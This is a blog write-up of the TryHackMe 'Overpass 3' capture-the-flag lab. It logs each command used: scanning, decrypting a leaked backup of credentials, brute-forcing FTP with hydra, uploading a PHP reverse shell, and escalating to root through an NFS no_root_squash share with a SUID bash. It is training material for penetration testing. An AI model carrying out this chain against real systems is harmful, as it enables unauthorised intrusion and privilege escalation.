---
layout: project
type: project
image: images/writeups/thm/overpass-3/logo.png
title: Overpass 3 - TryHackMe
permalink: writeups/overpass-3
# All dates must be YYYY-MM-DD format!
date: 2021-04-20
labels:
  - TryHackMe
  - Forensics
  - Wireshark
summary: You know them, you love them, your favourite group of broke computer science students have another business venture! Show them that they probably should hire someone for security...
---

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/overpass-3/header.png">
<script src="https://www.tryhackme.com/badge/192700"></script>

```
MACHINE = OVERPASS 3
TARGET = VARIABLE
OS = LINUX
DIFFICULTY = MEDIUM
```
## Enumeration

Starting with an nmap scan

```console
┌──(root💀Toyin)-[~/infosec/thm/overpass-series/3]
└─# nmap -T4 -A 10.10.153.169 -oN nmap
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-20 19:31 WAT
Nmap scan report for 10.10.153.169
Host is up (0.28s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   3072 de:5b:0e:b5:40:aa:43:4d:2a:83:31:14:20:77:9c:a1 (RSA)
|   256 f4:b5:a6:60:f4:d1:bf:e2:85:2e:2e:7e:5f:4c:ce:38 (ECDSA)
|_  256 29:e6:61:09:ed:8a:88:2b:55:74:f2:b7:33:ae:df:c8 (ED25519)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos)
|_http-title: Overpass Hosting
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (92%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 5.4 (86%), Linux 2.6.32 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Unix

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   316.52 ms 10.8.0.1
2   316.94 ms 10.10.153.169

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.30 seconds
```

I ran a nikto scan and got some useful information about the server.

+ Server: Apache/2.4.37 (centos)
+ Retrieved x-powered-by header: PHP/7.2.24

I ran gobuster in dir mode and got a directory /backups and found a file named backup.zip. It contained 2 files priv.key and CustomerDetails.xlsx.gpg

```console
┌──(root💀Toyin)-[~/infosec/thm/overpass-series/3]
└─# gobuster dir -u http://overpass.thm -w /opt/wordlists/raft-large-directories.txt -o gobuster-dir-root
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://overpass.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/wordlists/raft-large-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/04/20 20:04:55 Starting gobuster in directory enumeration mode
===============================================================
/backups              (Status: 301) [Size: 236] [--> http://overpass.thm/backups/]

┌──(root💀Toyin)-[~/infosec/thm/overpass-series/3]
└─# unzip backup.zip
Archive:  backup.zip
 extracting: CustomerDetails.xlsx.gpg
  inflating: priv.key
```

Importing the private key file, priv.key, I found that it was probably for the user Paradox

```console
┌──(root💀Toyin)-[~/infosec/thm/overpass-series/3/backups]
└─# gpg --import priv.key
gpg: /root/.gnupg/trustdb.gpg: trustdb created
gpg: key C9AE71AB3180BC08: public key "Paradox <paradox@overpass.thm>" imported
gpg: key C9AE71AB3180BC08: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
┌──(root💀Toyin)-[~/infosec/thm/overpass-series/3/backups]
└─# gpg -d CustomerDetails.xlsx.gpg > CustomerDetails.xlsx
gpg: encrypted with 2048-bit RSA key, ID 9E86A1C63FB96335, created 2020-11-08
      "Paradox <paradox@overpass.thm>"
```

Opening the decrypted file, I found a list of usernames and passwords

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/overpass-3/1.png">

```
paradox:ShibesAreGreat123
0day:OllieIsTheBestDog
muirlandoracle:A11D0gsAreAw3s0me
```

## Exploitation

Using the credentials I used hydra to bruteforce the ftp login and got a hit

```console
┌──(root💀Toyin)-[~/infosec/thm/overpass-series/3]
└─# hydra -L users -P pass overpass.thm ftp
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-20 20:17:55
[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:3/p:3), ~1 try per task
[DATA] attacking ftp://overpass.thm:21/
[21][ftp] host: overpass.thm   login: paradox   password: ShibesAreGreat123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-20 20:18:00
```

Logging in to the ftp server with the credentials and enumerating I found that the ftp directory was also the directory for the web server. I found that I could upload files to the directory and I tested this using a hello.txt file.

```console
┌──(root💀Toyin)-[~/infosec/thm/overpass-series/3]
└─# ftp overpass.thm
Connected to overpass.thm.
220 (vsFTPd 3.0.3)
Name (overpass.thm:root): paradox
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 48       48             24 Nov 08 21:25 backups
-rw-r--r--    1 0        0           65591 Nov 17 20:42 hallway.jpg
-rw-r--r--    1 0        0            1770 Nov 17 20:42 index.html
-rw-r--r--    1 0        0             576 Nov 17 20:42 main.css
-rw-r--r--    1 0        0            2511 Nov 17 20:42 overpass.svg
226 Directory send OK.

ftp> put hello.txt
local: hello.txt remote: hello.txt
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
6 bytes sent in 0.00 secs (66.5838 kB/s)
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 48       48             24 Nov 08 21:25 backups
-rw-r--r--    1 0        0           65591 Nov 17 20:42 hallway.jpg
-rw-r--r--    1 1001     1001            6 Apr 20 19:21 hello.txt
-rw-r--r--    1 0        0            1770 Nov 17 20:42 index.html
-rw-r--r--    1 0        0             576 Nov 17 20:42 main.css
-rw-r--r--    1 0        0            2511 Nov 17 20:42 overpass.svg
226 Directory send OK.
```
<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/overpass-3/2.png">

Knowing that the web server is running php I used a php reverse shell script to get a shell.

```console
ftp> put shell.php
local: shell.php remote: shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.

#using curl
┌──(root💀Toyin)-[~/infosec/thm/overpass-series/3/ftp]
└─# curl http://overpass.thm/shell.php

#getting reverse shell
┌──(root💀Toyin)-[~/infosec/thm/overpass-series/3]
└─# nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.153.169 35162
Linux localhost.localdomain 4.18.0-193.el8.x86_64 #1 SMP Fri May 8 10:59:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 20:29:30 up  1:03,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: cannot set terminal process group (850): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4$ whoami
whoami
apache
```

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/overpass-3/3.png">

I found the web flag in /usr/share/httpd

```console
sh-4.4$ ls -la
ls -la
total 24
drwxr-xr-x.  5 root root   63 Nov 17 20:54 .
drwxr-xr-x. 81 root root 4096 Nov  8 02:02 ..
drwxr-xr-x.  3 root root 4096 Nov  8 02:02 error
drwxr-xr-x.  3 root root 8192 Nov  8 02:02 icons
drwxr-xr-x.  3 root root  140 Nov  8 02:02 noindex
-rw-r--r--.  1 root root   38 Nov 17 20:54 web.flag
sh-4.4$ pwd
/usr/share/httpd
```

## Privilege Escalation

I used the credentials of paradox to switch to his user

```console
sh-4.4$ su paradox
su paradox
Password: ShibesAreGreat123

whoami
paradox
```

I used ssh-keygen to generate an ssh key pair and used it to ssh into the machine as paradox with a proper shell

```console
ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/paradox/.ssh/id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/paradox/.ssh/id_rsa.
Your public key has been saved in /home/paradox/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:Lj7X/+9IG4AFso38v04btU/gvwfpNXnHVaaoCse+Qm8 paradox@localhost.localdomain
The key's randomart image is:
+---[RSA 3072]----+
|        . .      |
|       . = .    o|
|        + . .. o.|
|         . o. . .|
|       .S o.. ooo|
|      o.o .. +o==|
|     ..=.o  +.=o=|
|     .o.E .. =.B.|
|      .=.. o=.++B|
+----[SHA256]-----+
mv id_rsa.pub authorized_keys
```

```console
┌──(root💀Toyin)-[~/infosec/thm/overpass-series/3]
└─# ssh -i id_rsa_paradox paradox@10.10.153.169
Last login: Tue Apr 20 20:43:59 2021 from 10.8.169.153
[paradox@localhost ~]$
```

Running linpeas.sh I got an interesting [NFS Share Exploit](https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe)

```
[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
/home/james *(rw,fsid=0,sync,no_root_squash,insecure)
```

I tried mounting but I got an error so I checked for open ports so I could use an ssh tunnel to get access. 

```console
#target
[paradox@localhost ~]$ ss -tnlp
State          Recv-Q         Send-Q                 Local Address:Port                  Peer Address:Port
LISTEN         0              128                          0.0.0.0:111                        0.0.0.0:*
LISTEN         0              128                          0.0.0.0:20048                      0.0.0.0:*
LISTEN         0              128                          0.0.0.0:22                         0.0.0.0:*
LISTEN         0              128                          0.0.0.0:55257                      0.0.0.0:*
LISTEN         0              64                           0.0.0.0:44699                      0.0.0.0:*
LISTEN         0              64                           0.0.0.0:2049                       0.0.0.0:*
LISTEN         0              128                             [::]:111                           [::]:*
LISTEN         0              128                             [::]:20048                         [::]:*
LISTEN         0              128                                *:80                               *:*
LISTEN         0              64                              [::]:39091                         [::]:*
LISTEN         0              128                             [::]:40371                         [::]:*
LISTEN         0              32                                 *:21                               *:*
LISTEN         0              128                             [::]:22                            [::]:*
LISTEN         0              64                              [::]:2049                          [::]:*
```

I used ssh port forwarding to get access to the nfs port on port 2049

```console
┌──(root💀Toyin)-[~/infosec/thm/overpass-series/3/ftp]
└─# ssh -L 2049:10.10.134.5:2049 -i ../id_rsa_paradox paradox@10.10.134.5
Last login: Tue Apr 20 21:41:16 2021 from 10.8.169.153
[paradox@localhost ~]$

┌──(root💀Toyin)-[~/infosec/thm/overpass-series/3]
└─# ss -tunlp
Netid  State   Recv-Q  Send-Q     Local Address:Port     Peer Address:Port  Process
udp    UNCONN  0       0                0.0.0.0:34946         0.0.0.0:*      users:(("openvpn",pid=47,fd=3))
tcp    LISTEN  0       1                0.0.0.0:4444          0.0.0.0:*      users:(("nc",pid=23763,fd=3))
tcp    LISTEN  0       128            127.0.0.1:2049          0.0.0.0:*      users:(("ssh",pid=26912,fd=5))
tcp    LISTEN  0       128                [::1]:2049             [::]:*      users:(("ssh",pid=26912,fd=4))
```

I then tried mounting the nfs share and got the next flag.

```console
┌──(root💀Toyin)-[~]
└─# mount -v -t nfs localhost:/ /tmp/pe
┌──(root💀Toyin)-[/tmp/pe]
└─# ls -la
total 88
drwx------  3 nullcell nullcell   112 Nov 17 22:15 .
drwxrwxrwt 28 root     root     69632 Apr 20 22:04 ..
lrwxrwxrwx  1 root     root         9 Nov  8 22:45 .bash_history -> /dev/null
-rw-r--r--  1 nullcell nullcell    18 Nov  8  2019 .bash_logout
-rw-r--r--  1 nullcell nullcell   141 Nov  8  2019 .bash_profile
-rw-r--r--  1 nullcell nullcell   312 Nov  8  2019 .bashrc
drwx------  2 nullcell nullcell    61 Nov  8 03:20 .ssh
-rw-------  1 nullcell nullcell    38 Nov 17 22:15 user.flag
```

I got the ssh key for the user james and exploiting the nfs share further I uploaded a bash executable and set the SUID bit on it. I the used the ssh key of james to login and run the bash SUID executable with the -p flag and got root.

```console
#local machine
┌──(root💀Toyin)-[/tmp/pe]
└─# cp /bin/bash .
┌──(root💀Toyin)-[/tmp/pe]
└─# chmod +s ./bash

#target machine
┌──(root💀Toyin)-[~/infosec/thm/overpass-series/3]
└─# ssh -i id_rsa_james james@10.10.134.5
Last login: Wed Nov 18 18:26:00 2020 from 192.168.170.145
[james@localhost ~]$ ./bash -p
./bash: /lib64/libtinfo.so.6: no version information available (required by ./bash)
bash-5.1# whoami
root
```

pwned